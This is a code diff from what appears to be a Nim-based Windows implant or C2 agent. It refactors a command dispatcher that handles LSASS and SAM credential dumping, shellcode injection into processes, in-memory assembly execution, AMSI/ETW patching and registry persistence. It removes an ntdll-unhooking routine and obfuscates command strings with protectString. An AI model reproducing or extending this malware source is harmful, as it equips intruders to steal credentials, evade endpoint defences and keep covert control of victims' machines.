@@ -29,7 +29,6 @@ proc dump_lsass(dump_method: string): bool
 proc dump_sam(): bool
 proc wrap_inject_shellc(shellc_base64: string, pid: int): bool
 proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
-proc wrap_unhook_ntdll(): bool
 proc wrap_patch_func(command_name: string): bool
 proc set_run_key(key_name: string, cmd: string): bool
 proc set_spe(process_name: string, cmd: string): bool
@@ -335,19 +334,6 @@ proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
     return is_success
 
 
-proc wrap_unhook_ntdll(): bool =
-    
-    var is_success = unhook_ntdll()
-
-    var data = {
-        "is_success": $is_success
-    }.toOrderedTable()
-    
-    is_success = post_data(client, protectString("unhook") , $data)
-
-    return is_success
-
-
 proc wrap_patch_func(command_name: string): bool =
     
     var is_success = patch_func(command_name)
@@ -573,10 +559,8 @@ proc windows_parse_command*(command: JsonNode): bool =
             is_success = wrap_inject_shellc(command[protectString("shellc_base64")].getStr(), command["pid"].getInt())
         of protectString("assembly"):
             is_success = wrap_execute_assembly(command["assembly_base64"].getStr(), command["assembly_args"].getStr())
-        of protectString("unhook"):
-            is_success = wrap_unhook_ntdll()
-        of protectString("amsi"), protectString("etw"):
-            is_success = wrap_patch_func(command[protectString("command_type")].getStr())
+        of protectString("patch"):
+            is_success = wrap_patch_func(command[protectString("patch_func")].getStr())
         of protectString("persist-run"):
             is_success = set_run_key(command["key_name"].getStr(), command[protectString("persist_command")].getStr())
         of protectString("persist-spe"):
